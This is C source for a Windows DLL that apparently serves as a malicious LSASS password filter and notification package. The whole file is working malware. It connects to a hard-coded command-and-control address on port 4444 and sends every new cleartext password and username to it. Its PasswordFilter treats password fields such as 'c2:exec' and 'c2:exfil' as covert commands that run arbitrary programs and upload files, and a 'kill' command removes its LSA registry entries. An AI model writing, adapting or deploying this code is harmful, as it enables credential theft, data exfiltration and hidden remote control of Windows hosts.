#define WIN32_NO_STATUS
#include <winsock2.h>    
#include <ws2tcpip.h>
#include <windows.h>
#include <winnt.h>
#undef WIN32_NO_STATUS

#include <ntstatus.h>
#include <ntsecapi.h>
#include <winternl.h>

#include <winsock2.h>
#include <ws2tcpip.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <strsafe.h>
#include <stdarg.h>

// ---------------------------------------------------------------------
//C2 stuff
#pragma comment(lib, "ws2_32.lib")  

#define SERVER_PORT 4444
#define RETRY_DELAY 10000  // milliseconds (10s)
#define SERVER_IP   "192.168.157.140"
#define DEBUG_LOG   "C:\\Windows\\Temp\\cory_debug.txt"
// ---------------------------------------------------------------------

// ---------------------------------------------------------------------
// Message stuff to send to C2
#define MSG_COMMAND  0x01  // server -> agent: run this
#define MSG_RESULT   0x02  // agent -> server: output/result
#define MSG_LOG      0x03  // agent -> server: log entry
#define MSG_PING     0x04  // either direction: keepalive

typedef struct {
    uint8_t  type;
    uint32_t length;  // length of data that follows
    char     data[];  // flexible array, actual payload
} Message;

// ---------------------------------------------------------------------

// ---------------------------------------------------------------------
// Names of DLLs to remove when 'kill' is called
static const char* BLACKLIST[] = {
    "cory_filter",
    "cory_msv",
    "cory_ssp"
};
// ---------------------------------------------------------------------

static SOCKET g_sock = INVALID_SOCKET;

// ─── debug logger ────────────────────────────────────────────────────────────
void debug_log(const char* fmt, ...) {
    FILE* f = fopen(DEBUG_LOG, "a");
    if (!f) return;                     // if even this fails, you have bigger problems

    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d.%03d] ",
            st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

    va_list args;
    va_start(args, fmt);
    vfprintf(f, fmt, args);
    va_end(args);

    fprintf(f, "\n");
    fflush(f);
    fclose(f);
}

// ─── connect ─────────────────────────────────────────────────────────────────
SOCKET connect_to_server() {
    SOCKET sock;
    struct sockaddr_in addr;

    debug_log("connect_to_server: creating socket...");
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        debug_log("connect_to_server: socket() FAILED, WSAError=%d", WSAGetLastError());
        return INVALID_SOCKET;
    }
    debug_log("connect_to_server: socket created OK");

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(SERVER_PORT);

    // inet_addr is deprecated — use InetPtonA so we see parse errors
    int pton_ret = InetPtonA(AF_INET, SERVER_IP, &addr.sin_addr);
    debug_log("connect_to_server: InetPtonA(\"%s\") returned %d", SERVER_IP, pton_ret);
    if (pton_ret != 1) {
        debug_log("connect_to_server: bad IP string, aborting");
        closesocket(sock);
        return INVALID_SOCKET;
    }

    debug_log("connect_to_server: calling connect() to %s:%d ...", SERVER_IP, SERVER_PORT);
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        debug_log("connect_to_server: connect() FAILED, WSAError=%d", WSAGetLastError());
        closesocket(sock);
        return INVALID_SOCKET;
    }

    debug_log("connect_to_server: connected successfully");
    return sock;
}

// ─── recv thread ─────────────────────────────────────────────────────────────
DWORD WINAPI recv_thread(LPVOID lpParam) {
    char buf[4096];
    int n;

    debug_log("recv_thread: started");

    while ((n = recv(g_sock, buf, sizeof(buf) - 1, 0)) > 0) {
        buf[n] = '\0';
        debug_log("recv_thread: received %d bytes: %s", n, buf);
    }

    debug_log("recv_thread: recv loop ended (n=%d, WSAError=%d)", n, WSAGetLastError());
    g_sock = INVALID_SOCKET;
    return 0;
}

// ─── send to server ──────────────────────────────────────────────────────────
void log_to_server(const char* msg) {
    if (g_sock != INVALID_SOCKET) {
        int ret = send(g_sock, msg, (int)strlen(msg), 0);
        debug_log("log_to_server: send(\"%s\") returned %d", msg, ret);
    } else {
        debug_log("log_to_server: skipped, g_sock is INVALID");
    }
}

// ─── agent thread ────────────────────────────────────────────────────────────
DWORD WINAPI agent_thread(LPVOID lpParam) {
    debug_log("agent_thread: started (TID=%lu)", GetCurrentThreadId());

    WSADATA wsa;
    int wsa_ret = WSAStartup(MAKEWORD(2, 2), &wsa);
    debug_log("agent_thread: WSAStartup returned %d", wsa_ret);
    if (wsa_ret != 0) {
        debug_log("agent_thread: WSAStartup FAILED, aborting");
        return 1;
    }

    debug_log("agent_thread: calling connect_to_server...");
    g_sock = connect_to_server();

    if (g_sock == INVALID_SOCKET) {
        debug_log("agent_thread: connection FAILED, no recv_thread will be spawned");
        WSACleanup();
        return 1;
    }

    debug_log("agent_thread: connection OK, spawning recv_thread...");
    HANDLE hRecv = CreateThread(NULL, 0, recv_thread, NULL, 0, NULL);
    if (hRecv == NULL) {
        debug_log("agent_thread: CreateThread(recv_thread) FAILED, GLE=%lu", GetLastError());
    } else {
        debug_log("agent_thread: recv_thread spawned OK");
        CloseHandle(hRecv);
    }

    debug_log("agent_thread: entering keep-alive loop");
    while (g_sock != INVALID_SOCKET) {
        Sleep(1000);
    }

    debug_log("agent_thread: g_sock went invalid, cleaning up");
    WSACleanup();
    return 0;
}

// ─── DllMain ─────────────────────────────────────────────────────────────────
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Write this immediately — before the thread even spawns
        // If you don't see this in the log, LSASS never even hit DllMain
        debug_log("DllMain: DLL_PROCESS_ATTACH fired (PID=%lu)", GetCurrentProcessId());

        HANDLE h = CreateThread(NULL, 0, agent_thread, NULL, 0, NULL);
        if (h == NULL) {
            debug_log("DllMain: CreateThread(agent_thread) FAILED, GLE=%lu", GetLastError());
        } else {
            debug_log("DllMain: agent_thread spawned OK (handle=%p)", h);
            CloseHandle(h);
        }
    }
    return TRUE;
}

void clean_reg(HKEY root, const char* keyPath, const char* valueName) {
    HKEY hKey;
    char data[4096] = {0};
    DWORD size = sizeof(data);

    if (RegOpenKeyExA(root, keyPath, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return;

    if (RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS) {
        for (int i = 0; i < sizeof(BLACKLIST) / sizeof(BLACKLIST[0]); i++) {
            if (strstr(data, BLACKLIST[i])) {
                log_to_server("Found reg value, deleting it");
                RegDeleteValueA(hKey, valueName); // or set to empty
            }
        }
    }

    RegCloseKey(hKey);
}

// Called once when LSASS loads your DLL at boot
// Must return TRUE to signal successful initialization
BOOLEAN WINAPI InitializeChangeNotify(void) {
    log_to_server("LSASS has loaded my thing!");
    return TRUE;
}

// Called on every proposed password change
// Fails silently if c2 format is wrong
// Format: c2:<COMMAND>:<ARG1>:<ARG2>:...
BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full_name, PUNICODE_STRING password, BOOLEAN set_operation) {
    wchar_t* tokens[16];  
    int count = 0;

    wchar_t* ctx;
    wchar_t* token = wcstok(password->Buffer, L":", &ctx);
    while (token != NULL && count < 16) {

        tokens[count++] = token;
        token = wcstok(NULL, L":", &ctx);
    
    }

    wchar_t *c2_identifier = tokens[0];
    wchar_t *cmd = tokens[1];
    wchar_t *arg1 = tokens[2];

    // check if it is a C2 command...
    if (wcscmp(c2_identifier, L"c2") == 0 || wcscmp(c2_identifier, L"C2") == 0){

        if (wcscmp(cmd, L"exec") == 0) {
            STARTUPINFOW si;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);

            PROCESS_INFORMATION pi;
            ZeroMemory(&pi, sizeof(pi));

            BOOL process_make_attempt = CreateProcessW(
                arg1,
                NULL,                                    // no extra args
                NULL, NULL,                              // default security
                FALSE,                                   // don't inherit handles
                0,                                       // no special flags
                NULL, NULL,                              // inherit env and cwd
                &si,
                &pi
            );

            if (!process_make_attempt){
                log_to_server("ATTEMPT TO EXEC FILE PATH FAILED!");
            } else {
                log_to_server("PROCESS HAS BEEN MADE FOR THE FILE YOU POINTED TO");
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }

        } else if (wcscmp(cmd, L"exfil") == 0) {

            HANDLE hFile = CreateFileW(
                tokens[2],  // path
                GENERIC_READ,               // read access
                FILE_SHARE_READ,            // allow others to read simultaneously
                NULL,                       // default security
                OPEN_EXISTING,              // only open if it exists
                FILE_ATTRIBUTE_NORMAL,      // normal file
                NULL                        // no template
            );

            if (hFile == INVALID_HANDLE_VALUE) {
                log_to_server("FAILED TO OPEN REQUESTED FILE TO READ INTO");
            } else {
                char buf[4096];
                DWORD bytesRead;

                log_to_server("\n\n======================= REQUESTED FILE CONTENTS =========================================\n\n");
                while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
                    
                    buf[bytesRead] = '\0';
                    log_to_server(buf);
                
                }
                log_to_server("\n\n======================= END OF REQUESTED FILE CONTENTS ==================================\n\n");

                CloseHandle(hFile);
            }

        } else if (wcscmp(tokens[1], L"persist") == 0) {

            log_to_server("to implement later");

        } else if (wcscmp(tokens[1], L"kill") == 0) {

            clean_reg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "Auth0");
            clean_reg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "Security Packages");
            clean_reg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "Notification Packages");

        } else {
          
            log_to_server("Detected attempted C2 command: COMMAND WAS INALID");
        
        }

    }

    return TRUE;
}

// Called after every successful password change
// Receives cleartext username and new password
// Return STATUS_SUCCESS (0) when done
NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING user_name, ULONG relative_id, PUNICODE_STRING new_password) {
    char buf[256];
    char user_buf[128];
    char pass_buf[128];

    WideCharToMultiByte(CP_UTF8, 0, user_name->Buffer, user_name->Length / sizeof(WCHAR), user_buf, sizeof(user_buf), NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, new_password->Buffer, new_password->Length / sizeof(WCHAR), pass_buf, sizeof(pass_buf), NULL, NULL);

    user_buf[user_name->Length / sizeof(WCHAR)] = '\0';
    pass_buf[new_password->Length / sizeof(WCHAR)] = '\0';

    StringCbPrintfA(buf, sizeof(buf), "%lu : %s : %s", relative_id, user_buf, pass_buf);

    log_to_server("\n\n-- NEW CREDS SET --");
    log_to_server(buf);
    log_to_server("--------------------\n\n");

    return TRUE;
}